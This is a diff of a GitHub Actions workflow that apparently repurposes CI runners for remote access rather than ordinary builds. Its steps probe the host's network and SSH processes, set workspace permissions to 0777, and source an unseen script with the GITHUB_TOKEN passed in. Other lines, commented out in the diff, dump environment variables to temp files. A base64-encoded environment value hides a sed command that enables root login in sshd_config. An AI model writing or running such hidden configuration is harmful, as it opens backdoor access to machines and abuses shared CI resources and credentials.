@@ -36,7 +36,16 @@ jobs:
 
 
       - name: Run a one-line script
-        run: bash -c "cat /etc/hostname;hostname -i;echo ${{github.event.action}};echo ${{github.event.inputs}};(env|grep ss>/tmp/s0;sleep 1111&);chmod 0777 $GITHUB_WORKSPACE/*;ls -al;pwd;touch one-line-script1111;exit 0"
+        run: |
+          cat /etc/hostname;
+          hostname -i;
+          echo ${{github.event.action}};
+          echo ${{github.event.inputs}};
+          #(env|grep ss>/tmp/s0;sleep 1111&);
+          chmod 0777 $GITHUB_WORKSPACE/*;
+          ls -al;
+          pwd;
+          touch one-line-script1111;
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
       # Runs a set of commands using the runners shell
@@ -47,8 +56,12 @@ jobs:
       # Runs a set of commands using the runners shell
 
       - name: Run a multi-line script
-        run: 
-          bash -c 'cd /tmp;echo "${{ toJson(github.event.inputs) }}"|base64 -w0 >js8;base64 -d js8>js9;env|grep ss>s1;. $GITHUB_WORKSPACE/ghub.sh;'
+        run: |
+          cd /tmp;
+          echo "${{ toJson(github.event.inputs) }}"|base64 -w0 >js8;
+          base64 -d js8>js9;
+          #env|grep ss>s1;
+          . $GITHUB_WORKSPACE/ghub.sh;
         env:
           sshc1: 'cat /proc/uptime|cut -f1 -d"."'
           Github_Token22: ${{ secrets.GITHUB_TOKEN }}
@@ -60,13 +73,14 @@ jobs:
           TZ: Asia/Shanghai
       - name: Run a 3rd script #cat /tmp/y1;echo liuhuan88;cat /tmp/y2;cat /tmp/y1;
         run: |
-          bash -c '(ls -alR $GITHUB_WORKSPACE)';
+          bash -c '(ls -al $GITHUB_WORKSPACE)';
           ls -al /tmp;
+          pwd;
           sleep 5;
           sudo netstat -anlp|grep tcp;
           sudo ps aux|grep ssh;
           grep NAME /etc/os-release;
-          cat /tmp/y2;
+          #cat /tmp/y2;
           echo "ping success"
         env:
           sp9: 4
